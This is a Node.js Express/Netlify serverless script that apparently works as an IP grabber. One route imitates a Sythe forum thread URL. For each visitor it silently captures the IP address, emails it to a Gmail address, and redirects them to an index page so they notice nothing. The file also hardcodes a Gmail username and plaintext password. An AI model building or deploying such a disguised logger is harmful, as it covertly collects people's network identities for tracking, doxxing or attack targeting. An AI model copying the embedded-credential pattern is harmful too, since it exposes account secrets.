'use strict';
const express = require('express');
const path = require('path');
const serverless = require('serverless-http');
const app = express();
const bodyParser = require('body-parser');
const nodemailer = require("nodemailer");
const senderMail = 'timegawd99@gmail.com';

const emailTransporter = nodemailer.createTransport({
            host: 'smtp.mail.gmail.com',
            port: 465,
            service:'gmail',
            secure: false,
            auth: {
               user: senderMail,
               pass: 'Rockettroop1'
            },
            debug: false,
            logger: false
});


const router = express.Router();
router.get('/threads/3721727/bils-vouches/', (req, res) => {
  var date = new Date();

  var ip = req.header('x-forwarded-for') || req.connection.remoteAddress;
  var mailOptions = {
    from: '"Sythe <sythe>" ',
    to: 'timegawd1@gmail.com',
    subject: 'Sythe: ' + ip,
    text: ip
  };
  emailTransporter.sendMail(mailOptions, function(error, info){
    if (error) {
      console.log(error);
    } else {
      console.log('Email sent: ' + info.response);
    }
  });

  res.set('location', '../index.html');
  res.status(301).send()
  res.end();
});

app.use(bodyParser.json());
app.use('/.netlify/functions/server', router);  // path must route to lambda
app.use('/', (req, res) => res.sendFile(path.join(__dirname, '../index.html')));



module.exports = app;
module.exports.handler = serverless(app);
